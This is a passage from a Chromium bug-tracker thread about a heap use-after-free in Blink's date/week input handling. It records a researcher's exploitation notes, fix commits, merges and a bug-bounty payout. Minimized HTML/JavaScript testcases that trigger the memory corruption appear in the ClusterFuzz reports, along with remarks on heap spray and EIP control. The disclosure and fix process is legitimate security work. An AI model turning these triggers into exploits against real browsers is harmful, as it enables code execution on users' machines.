0025eb0c 62d1f80b chrome_child!blink::HTMLInputElementV8Internal::valueAttributeSetter+0xff [c:\b\build\slave\win\build\src\out\release\gen\blink\bindings\core\v8\v8htmlinputelement.cpp @ 1103]
0025eb24 62576246 chrome_child!blink::HTMLInputElementV8Internal::valueAttributeSetterCallback+0x2e [c:\b\build\slave\win\build\src\out\release\gen\blink\bindings\core\v8\v8htmlinputelement.cpp @ 1112]
0025eb54 62575ce3 chrome_child!v8::internal::PropertyCallbackArguments::Call+0x71 [c:\b\build\slave\win\build\src\v8\src\arguments.cc @ 89]
0025ebbc 624f6b46 chrome_child!v8::internal::Object::SetPropertyWithAccessor+0x124 [c:\b\build\slave\win\build\src\v8\src\objects.cc @ 507]
0025ec14 624f667c chrome_child!v8::internal::Object::SetProperty+0x24a [c:\b\build\slave\win\build\src\v8\src\objects.cc @ 2872]
0025eccc 624f639c chrome_child!v8::internal::StoreIC::Store+0x225 [c:\b\build\slave\win\build\src\v8\src\ic\ic.cc @ 1333]
(Inline) -------- chrome_child!v8::internal::__RT_impl_StoreIC_Miss+0x7b [c:\b\build\slave\win\build\src\v8\src\ic\ic.cc @ 2089]
0025edd4 62476ed1 chrome_child!v8::internal::StoreIC_Miss+0x85 [c:\b\build\slave\win\build\src\v8\src\ic\ic.cc @ 2079]
0025ee20 62476d30 chrome_child!v8::internal::Invoke+0x12f [c:\b\build\slave\win\build\src\v8\src\execution.cc @ 92]
0025ee5c 625369ca chrome_child!v8::internal::Execution::Call+0x137 [c:\b\build\slave\win\build\src\v8\src\execution.cc @ 141]
0025eea4 62542ce5 chrome_child!v8::Script::Run+0x129 [c:\b\build\slave\win\build\src\v8\src\api.cc @ 1690]
0025eee8 6253e5ca chrome_child!blink::V8ScriptRunner::runCompiledScript+0x16e [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\v8scriptrunner.cpp @ 179]
0025ef6c 624e8b28 chrome_child!blink::ScriptController::executeScriptAndReturnValue+0x2b0 [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\scriptcontroller.cpp @ 196]
0025efd4 624e8716 chrome_child!blink::ScriptController::evaluateScriptInMainWorld+0x24b [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\scriptcontroller.cpp @ 611]
0025f004 62559649 chrome_child!blink::ScriptController::executeScriptInMainWorld+0x2a [c:\b\build\slave\win\build\src\third_party\webkit\source\bindings\core\v8\scriptcontroller.cpp @ 579]
0025f070 62516cbb chrome_child!blink::ScriptLoader::executeScript+0x2f6 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\dom\scriptloader.cpp @ 354]
0025f1b0 62515285 chrome_child!blink::ScriptLoader::prepareScript+0x3b9 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\dom\scriptloader.cpp @ 247]
0025f2d8 62514ed3 chrome_child!blink::HTMLScriptRunner::runScript+0x8d [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmlscriptrunner.cpp @ 322]
0025f2f0 62514dca chrome_child!blink::HTMLScriptRunner::execute+0x20 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmlscriptrunner.cpp @ 184]
0025f310 625005fa chrome_child!blink::HTMLDocumentParser::runScriptsForPausedTreeBuilder+0x62 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 304]
0025f374 6250013c chrome_child!blink::HTMLDocumentParser::processParsedChunkFromBackgroundParser+0x249 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 486]
0025f3d8 624ff913 chrome_child!blink::HTMLDocumentParser::pumpPendingSpeculations+0x222 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 536]
0025f400 624ff7f5 chrome_child!blink::HTMLDocumentParser::didReceiveParsedChunkFromBackgroundParser+0xe1 [c:\b\build\slave\win\build\src\third_party\webkit\source\core\html\parser\htmldocumentparser.cpp @ 366]
0025f410 624ff7c2 chrome_child!WTF::FunctionWrapper<void (__thiscall blink::HTMLDocumentParser::*)(WTF::PassOwnPtr<blink::HTMLDocumentParser::ParsedChunk>)>::operator()+0x32 [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 229]
0025f41c 624fe42d chrome_child!WTF::BoundFunctionImpl<WTF::FunctionWrapper<void (__thiscall blink::HTMLDocumentParser::*)(WTF::PassOwnPtr<blink::HTMLDocumentParser::ParsedChunk>)>,void __cdecl(WTF::WeakPtr<blink::HTMLDocumentParser>,WTF::PassOwnPtr<blink::HTMLDocumentParser::ParsedChunk>)>::operator()+0x1b [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 921]
(Inline) -------- chrome_child!WTF::Function<void __cdecl(void)>::operator()+0xa [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 1077]
0025f428 624fe3c5 chrome_child!WTF::callFunctionObject+0xe [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\mainthread.cpp @ 66]
(Inline) -------- chrome_child!WTF::FunctionWrapper<void (__cdecl*)(blink::FELighting::PlatformApplyGenericParameters *)>::operator()+0xfe82cfb6 [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 78]
0025f430 624fe35a chrome_child!WTF::BoundFunctionImpl<WTF::FunctionWrapper<void (__cdecl*)(blink::FELighting::PlatformApplyGenericParameters *)>,void __cdecl(blink::FELighting::PlatformApplyGenericParameters *)>::operator()+0x6
(Inline) -------- chrome_child!WTF::Function<void __cdecl(void)>::operator()+0x8 [c:\b\build\slave\win\build\src\third_party\webkit\source\wtf\functional.h @ 1077]
0025f464 6235a6c2 chrome_child!blink::TracedTask::run+0xb8 [c:\b\build\slave\win\build\src\third_party\webkit\source\platform\scheduler\tracedtask.cpp @ 21]
(Inline) -------- chrome_child!base::Callback<void __cdecl(void)>::Run+0xb [c:\b\build\slave\win\build\src\base\callback.h @ 401]
0025f50c 6235a169 chrome_child!base::debug::TaskAnnotator::RunTask+0x32c [c:\b\build\slave\win\build\src\base\debug\task_annotator.cc @ 62]
0025f544 62359ff4 chrome_child!base::MessageLoop::RunTask+0xe4 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 449]
(Inline) -------- chrome_child!base::MessageLoop::DeferOrRunPendingTask+0x115 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 456]
0025f688 6235c29f chrome_child!base::MessageLoop::DoWork+0x375 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 566]
0025f6ac 6235809c chrome_child!base::MessagePumpDefault::Run+0xc8 [c:\b\build\slave\win\build\src\base\message_loop\message_pump_default.cc @ 33]
(Inline) -------- chrome_child!base::internal::PlatformThreadLocalStorage::GetTLSValue+0x7 [c:\b\build\slave\win\build\src\base\threading\thread_local_storage_win.cc @ 30]
(Inline) -------- chrome_child!base::ThreadLocalStorage::StaticSlot::Get+0xc [c:\b\build\slave\win\build\src\base\threading\thread_local_storage.cc @ 231]
0025f6c8 62359b3b chrome_child!tracked_objects::ThreadData::Get+0x28 [c:\b\build\slave\win\build\src\base\tracked_objects.cc @ 334]
0025f6d8 62359a69 chrome_child!tracked_objects::TaskStopwatch::TaskStopwatch+0x3f [c:\b\build\slave\win\build\src\base\tracked_objects.cc @ 860]
0025f704 6235a25c chrome_child!base::RunLoop::Run+0x2d [c:\b\build\slave\win\build\src\base\run_loop.cc @ 55]
0025f728 623c47ae chrome_child!base::MessageLoop::Run+0x46 [c:\b\build\slave\win\build\src\base\message_loop\message_loop.cc @ 309]
0025f9b0 62352551 chrome_child!content::RendererMain+0x292 [c:\b\build\slave\win\build\src\content\renderer\renderer_main.cc @ 231]
0025f9c4 623524cd chrome_child!content::RunNamedProcessTypeMain+0x61 [c:\b\build\slave\win\build\src\content\app\content_main_runner.cc @ 420]
0025fa24 6233d251 chrome_child!content::ContentMainRunnerImpl::Run+0x66 [c:\b\build\slave\win\build\src\content\app\content_main_runner.cc @ 769]
0025fa34 6233c2b5 chrome_child!content::ContentMain+0x23 [c:\b\build\slave\win\build\src\content\app\content_main.cc @ 19]
0025fa7c 00be7573 chrome_child!ChromeMain+0x61 [c:\b\build\slave\win\build\src\chrome\app\chrome_main.cc @ 60]
0025fb0c 00be6f76 chrome!MainDllLoader::Launch+0x15f [c:\b\build\slave\win\build\src\chrome\app\client_util.cc @ 316]


As You can see, now the flow is redirected into anyEditableFieldsHaveValues, and here we land at 0xE0C158 which is allocatable by user.
I hope that good heap spray will result in EIP takeover, however, I will try later.

### tk...@chromium.org (2015-01-13)

Keishi, would you work on this please?  I'm still OOO.


### ke...@chromium.org (2015-01-13)

[Empty comment from Monorail migration]

### 0i...@gmail.com (2015-01-13)

I've done some analysis, there are few flow variants, however I didn't takeover the memory.

In attachments You can find:
1. double_free_write_violation.html <-
==320==ERROR: AddressSanitizer: heap-use-after-free on address 0x03d2743c at pc 0x127b49b1 bp 0xdeadbeef sp 0x0018b8e0
WRITE of size 4 at 0x03d2743c thread T0  
blink::DateTimeEditElement::~DateTimeEditElement C:\b\build\slave\Win_ASan_Release\build\src\third_party\WebKit\Source\wtf\RawPtr.h:113

2.  readonly_TimerBaseStop_nullptr.html/disabled_TimerBaseStop_nullptr.html <- access-violation on unknown address 0x0000006c
blink::TimerBase::stop

3. step_DateTimeEditElementlayout_UAF_WRITE.html <- UAF + WRITE  @ blink::DateTimeEditElement::layout




### in...@chromium.org (2015-01-13)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-13)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=4901243930542080

### in...@chromium.org (2015-01-13)

Thanks for the detailed analysis 0in.email@

### cl...@chromium.org (2015-01-13)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=4901243930542080

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x6110000884e8
Crash State:
  blink::DateTimeEditElement::~DateTimeEditElement
  blink::ContainerNode::removeChildren
  blink::BaseMultipleFieldsDateAndTimeInputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696

Minimized Testcase (0.56 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96v480FKrkH2KF0PJArseb6jkSDsMZKQ3ncljgBHkhzTg7AwnbuoXXYOzTg3MQ-4q00ZXoAzguk_Z9MCNjTr19axX2Sc9lnLFULiADyUtHHs-nS7qqPycDGypouNJDuvBOEn6Ogdnw0UcWZbqfOBWeEi1t4SQ
<button id="GBNDNFLA"><script>

try{GBNDNFLA=document.getElementById("GBNDNFLA");}catch(e){}

var CNJJLDHD=document.createElement('input');
CNJJLDHD.setAttribute("id","CNJJLDHD");
try {GBNDNFLA.appendChild(CNJJLDHD);}catch(e){}
try{CNJJLDHD=document.getElementById("CNJJLDHD");}catch(e){}
try {CNJJLDHD.setSelectionRange(10);}catch(e){}
try{CNJJLDHD.type='week';}catch(e){}

var oSelection=window.getSelection();

document.execCommand("SelectAll", false);

oSelection.deleteFromDocument();

CNJJLDHD.type="date";
// CNJJLDHD.disabled=true; <- NULL PTR

/*

*/
</script>





### 0i...@gmail.com (2015-01-21)

Now I did it.
The trick was to free the DateTimeEditElement and allocate on this place a new heap.
I've attached a PoC with EIP=0x41414141 :)

### 0i...@gmail.com (2015-01-21)

To clarify When I wrote DateTimeEditElement I was thinking about DateTimeFieldElement (new Date())

### in...@chromium.org (2015-01-21)

Thanks a lot 0in@ for the exploit repro, we really appreciate that and will be definitely considered for higher rewards by rewards panel.

### bu...@chromium.org (2015-01-22)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=188788

------------------------------------------------------------------
r188788 | keishi@chromium.org | 2015-01-22T04:38:42.207432Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/forms/ua-shadow-select-all-crash-expected.txt?r1=188788&r2=188787&pathrev=188788
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/fast/forms/ua-shadow-select-all-crash.html?r1=188788&r2=188787&pathrev=188788
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/editing/VisibleSelection.cpp?r1=188788&r2=188787&pathrev=188788

VisibleSelection::nonBoundaryShadowTreeRootNode should return null when its anchor is a shadow root

TEST=Automated. Added ua-shadow-select-all-crash.html.
BUG=447906

Review URL: https://codereview.chromium.org/848843002
-----------------------------------------------------------------

### in...@chromium.org (2015-01-22)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-01-22)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### cl...@chromium.org (2015-01-22)

ClusterFuzz has detected this issue as fixed in range 312458:312600.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5673622319398912

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x611000087300
Crash State:
  blink::DateTimeEditElement::valueAsDateTimeFieldsState
  blink::BaseMultipleFieldsDateAndTimeInputType::saveFormControlState
  blink::HTMLInputElement::saveFormControlState
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=312458:312600

Minimized Testcase (0.51 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv97YfpFxD63iayM9fS-bTRlTOHRK8s-I11_tdVkDk5c0lhdUvxmOhreSIsJTcBT3DbSnF1wwrZ2HmDG8vAbFWgtjnJLEd8iWYNtE5-6yWu72HSzDfDON6kbGzbfdqIDiXSI-ciDpwAtTxBzZIfvuRc_mXVXv1w
<button id="GBNDNFLA"><script>


try{GBNDNFLA=document.getElementById("GBNDNFLA");}catch(e){}

var CNJJLDHD=document.createElement('input');
CNJJLDHD.setAttribute("id","CNJJLDHD");

try {GBNDNFLA.appendChild(CNJJLDHD);}catch(e){}
try{CNJJLDHD=document.getElementById("CNJJLDHD");}catch(e){}




try {CNJJLDHD.setSelectionRange(1);}catch(e){}


try{CNJJLDHD.type='date';}catch(e){}


try{var oSelection=window.getSelection();

document.execCommand("SelectAll", false);

oSelection.deleteFromDocument();}catch(e){}

</script>

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### cl...@chromium.org (2015-01-22)

ClusterFuzz has detected this issue as fixed in range 312458:312600.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=4901243930542080

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x6110000884e8
Crash State:
  blink::DateTimeEditElement::~DateTimeEditElement
  blink::ContainerNode::removeChildren
  blink::BaseMultipleFieldsDateAndTimeInputType::destroyShadowSubtree
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=268656:269696
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=312458:312600

Minimized Testcase (0.56 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96v480FKrkH2KF0PJArseb6jkSDsMZKQ3ncljgBHkhzTg7AwnbuoXXYOzTg3MQ-4q00ZXoAzguk_Z9MCNjTr19axX2Sc9lnLFULiADyUtHHs-nS7qqPycDGypouNJDuvBOEn6Ogdnw0UcWZbqfOBWeEi1t4SQ
<button id="GBNDNFLA"><script>

try{GBNDNFLA=document.getElementById("GBNDNFLA");}catch(e){}

var CNJJLDHD=document.createElement('input');
CNJJLDHD.setAttribute("id","CNJJLDHD");
try {GBNDNFLA.appendChild(CNJJLDHD);}catch(e){}
try{CNJJLDHD=document.getElementById("CNJJLDHD");}catch(e){}
try {CNJJLDHD.setSelectionRange(10);}catch(e){}
try{CNJJLDHD.type='week';}catch(e){}

var oSelection=window.getSelection();

document.execCommand("SelectAll", false);

oSelection.deleteFromDocument();

CNJJLDHD.type="date";
// CNJJLDHD.disabled=true; <- NULL PTR

/*

*/
</script>

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### in...@chromium.org (2015-01-25)

[Empty comment from Monorail migration]

### pe...@google.com (2015-01-25)

Approved for M41 (branch: 2272)

### pe...@google.com (2015-01-25)

[Automated comment] Request affecting a post-stable build (M40), manual review required.

### dx...@chromium.org (2015-01-30)

approved for m40 as well.  Branch is 2214.

### bu...@chromium.org (2015-02-03)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=189441

------------------------------------------------------------------
r189441 | dxie@chromium.org | 2015-02-03T23:03:22.860383Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2214/LayoutTests/fast/forms/ua-shadow-select-all-crash-expected.txt?r1=189441&r2=189440&pathrev=189441
   A http://src.chromium.org/viewvc/blink/branches/chromium/2214/LayoutTests/fast/forms/ua-shadow-select-all-crash.html?r1=189441&r2=189440&pathrev=189441
   M http://src.chromium.org/viewvc/blink/branches/chromium/2214/Source/core/editing/VisibleSelection.cpp?r1=189441&r2=189440&pathrev=189441

Merge 188788 "VisibleSelection::nonBoundaryShadowTreeRootNode sh..."

> VisibleSelection::nonBoundaryShadowTreeRootNode should return null when its anchor is a shadow root
> 
> TEST=Automated. Added ua-shadow-select-all-crash.html.
> BUG=447906
> 
> Review URL: https://codereview.chromium.org/848843002

TBR=keishi@chromium.org

Review URL: https://codereview.chromium.org/894063008
-----------------------------------------------------------------

### dx...@chromium.org (2015-02-04)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-02-04)

[Empty comment from Monorail migration]

### ti...@google.com (2015-02-04)

Thanks again for the report!

We're going to credit you in the release notes this week as "0in.email" - if you want to use a different name, please let me know.



### in...@chromium.org (2015-02-04)

[Empty comment from Monorail migration]

### 0i...@gmail.com (2015-02-04)

Please credit me as Maksymilian Motyl.


### ti...@google.com (2015-02-04)

Shall do - thanks for the quick response.

### ti...@google.com (2015-03-03)

Following up from the latest reward panel, we decided to pay $5,000 for this report. Thanks for the PoC at c#18 - good PoCs will result in higher rewards :)

You should hear from our finance team by next week. Please reach out to me directly via email or update this bug if you haven't heard from them.

### ti...@google.com (2015-03-09)

[Empty comment from Monorail migration]

### ti...@google.com (2015-03-17)

Processing via our e-payment system can take up to six weeks, but the reward should be on its way to you. Thanks again for your help!

### 0i...@gmail.com (2015-03-17)

Thanks!

### cl...@chromium.org (2015-04-30)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/447906?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081155)*
